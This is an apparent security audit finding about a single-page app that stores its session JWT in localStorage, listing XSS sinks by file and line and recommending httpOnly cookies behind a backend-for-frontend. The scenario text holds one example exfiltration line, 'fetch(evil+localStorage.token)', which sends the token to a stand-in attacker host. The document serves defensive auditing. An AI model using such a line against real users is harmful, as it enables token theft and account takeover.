  cwe: CWE-922
  title: JWT stored in non-httpOnly localStorage — request.interceptor.ts:16
  affected_parameter: token
  scenario: 'The session JWT is persisted in localStorage and re-read on every outbound request by RequestInterceptor (request.interceptor.ts:13-18),
    which attaches it as ''Authorization: Bearer <token>''. localStorage is readable by any JavaScript executing in the origin,
    so any of the numerous DOM-XSS sinks in this SPA (search-result.component.ts:143, last-login-ip.component.ts:39, hacking-instructor/index.ts:126)
    lets an attacker exfiltrate the bearer token with a one-liner ''fetch(evil+localStorage.token)''. The OAuth flow (oauth.component.ts:50)
    and 2FA flow (two-factor-auth-enter.component.ts:53) both write the same token to localStorage, so every authentication
    path feeds this XSS-extractable store. Because there is no BFF, the SPA holds the full-power API credential client-side
    rather than behind a server session.'
  evidence_summary: RequestInterceptor reads the raw JWT from localStorage and the OAuth/2FA login paths write it there, with
    no httpOnly cookie alternative anywhere in the SPA.
  impact_description: A single successful XSS yields a long-lived bearer token usable for full account takeover and direct
    API access bypassing all client guards.
  likelihood: High
  impact: High
  risk: High
  controls_in_place: A duplicate 'token' cookie is set via CookieService in oauth.component.ts:49, but it is not httpOnly
    and the API authenticates from the Bearer header, so the cookie provides no protective value.
  mitigation_title: Move session tokens out of localStorage into httpOnly Secure SameSite cookies served by a BFF
  remediation:
    effort: High
    steps:
    - Introduce a Backend-for-Frontend that completes login server-side and issues the session as a Set-Cookie with HttpOnly;
      Secure; SameSite=Strict; the SPA never touches the raw token.
    - Delete the localStorage.setItem('token', ...) writes in oauth.component.ts, two-factor-auth-enter.component.ts and the
      login service, and remove the manual Authorization header in request.interceptor.ts so the cookie is sent automatically.
    - Have the BFF validate the cookie-bound session on each API call and forward an internal token the browser never sees.
    code_example: "// BFF response — token never reaches JS\nres.cookie('session', sessionId, {\n  httpOnly: true, secure:\
      \ true, sameSite: 'strict', maxAge: 8*3600*1000\n})"
    reference: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage
